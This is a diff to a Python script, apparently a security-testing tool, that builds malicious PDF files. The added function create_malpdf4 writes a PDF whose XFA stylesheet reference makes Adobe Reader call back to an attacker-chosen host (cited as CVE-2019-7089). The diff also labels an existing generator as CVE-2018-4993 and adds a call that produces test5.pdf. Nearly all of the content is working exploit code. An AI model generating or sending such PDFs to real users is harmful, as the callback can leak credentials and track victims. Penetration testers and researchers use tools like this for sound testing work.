@@ -87,6 +87,47 @@ trailer <<
     >>
 >>''')
 
+# Adobe Reader - PDF callback via XSLT stylesheet in XFA
+# CVE-2019-7089
+# From: https://insert-script.blogspot.com/2019/01/adobe-reader-pdf-callback-via-xslt.html
+def create_malpdf4(filename, host):
+    with io.FileIO(filename, "w") as file:
+        file.write('''
+        % a PDF file using an XFA
+% most whitespace can be removed (truncated to 570 bytes or so...)
+% Ange Albertini BSD Licence 2012
+
+%PDF-1. % can be truncated to %PDF-
+
+1 0 obj <<>>
+stream
+<?xml version="1.0" ?>
+<?xml-stylesheet href="\\''' + host + '''\whatever.xslt" type="text/xsl" ?>
+endstream
+endobj
+trailer <<
+    /Root <<
+
+        /AcroForm <<
+            /Fields [<<
+                /T (0)
+                /Kids [<<
+                    /Subtype /Widget
+                    /Rect []
+                    /T ()
+                    /FT /Btn
+                >>]
+            >>]
+            /XFA 1 0 R
+        >>
+        /Pages <<>>
+    >>
+>>
+''')
+
+
+# This is CVE-2018-4993
+# From https://github.com/deepzec/Bad-Pdf/blob/master/badpdf.py
 def create_malpdf(filename, host):
     with io.FileIO(filename, "w") as file:
         file.write('''
@@ -173,5 +214,6 @@ if __name__ == "__main__":
   create_malpdf("test2.pdf", 'https://' + host)
   create_malpdf2("test3.pdf", 'https://' + host)
   create_malpdf3("test4.pdf", 'https://' + host)
+  create_malpdf4("test5.pdf", 'https://' + host)
 
   print("Done.")
